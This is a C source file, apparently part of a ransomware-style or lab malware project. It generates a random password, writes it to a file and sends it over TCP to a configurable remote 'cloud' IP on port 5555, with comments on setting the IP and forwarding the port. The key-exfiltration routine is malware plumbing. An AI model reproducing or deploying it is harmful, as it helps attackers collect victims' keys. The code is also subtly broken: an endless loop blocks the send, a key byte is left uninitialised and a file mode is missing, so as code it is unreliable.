
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "key.h"

// change this to your actual machine IP
// hostname -I for linux, ipconfig for windows
// if run from wsl, forward the port from windows to wsl with netsh
#define CLOUD_IP "CHANGE"

int extract_key(char *key)
{
	char acknowledgement;
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		printf("extract_key: socket creation failed\n");
		return -1;
	}

	struct sockaddr_in server = {
        .sin_family = AF_INET,
        .sin_port   = htons(5555),
    };
    inet_pton(AF_INET, CLOUD_IP, &server.sin_addr);
	while (1)
	{
		connect(sock, (struct sockaddr*)&server, sizeof(server));
		if (recv(sock, &acknowledgement, 1, 0) < 0)
		{
			printf("extract_key: failed to receive acknowledgement\n");
			close(sock);
			sock = socket(AF_INET, SOCK_STREAM, 0);
			if (sock < 0)
			{
				printf("extract_key: socket creation failed during acknowledgement\n");
				return -1;
			}
		}
	}
    if (send(sock, key, PASS_SIZE, 0) < 0)
    {
        printf("extract_key: failed to send key\n");
        close(sock);
        return -1;
    }
    close(sock);
    return 0;
}

int generate_key(char *in)
{
	char *char_list = "1234567890~!@#$^&*()qwertyuiop[]QWERTYUIOP{}ASDFGHJKL:asdfghjklZXCVBNM<>zxcvbnm,.";
	int fd = open("/dev/random", O_RDONLY);
    if (fd < 0) {
        printf("generate_key: open /dev/random failed");
        return 1;
    }

    int total_read = 0;

    while (total_read < PASS_SIZE - 2) {
		unsigned char byte;
        ssize_t bytes_read = read(fd, &byte, 1);
        if (bytes_read < 0) {
            printf("generate_key: read /dev/random failed");
            close(fd);
            return 1;
        }

		in[total_read] = char_list[byte % strlen(char_list)];
        total_read += 1;
    }
	in[PASS_SIZE - 1] = 0;

    close(fd);
	return 0;
}

int send_key(char *key)
{
	int fd = open(PASS_FILE_DEST, O_WRONLY | O_CREAT | O_TRUNC);
	if (fd < 0)
	{
		printf("send_key: failed to create new file: %d\n", errno);
		return 1;
	}

	if (write(fd, key, PASS_SIZE) < 0)
	{
		printf("send_key: failed to write key: %d\n", errno);
		close(fd);
		return 1;
	}
	close(fd);
	
	if (extract_key(key) < 0)
	{
		printf("send_key: failed to send key\n");
		return 1;
	}
	return 0;
}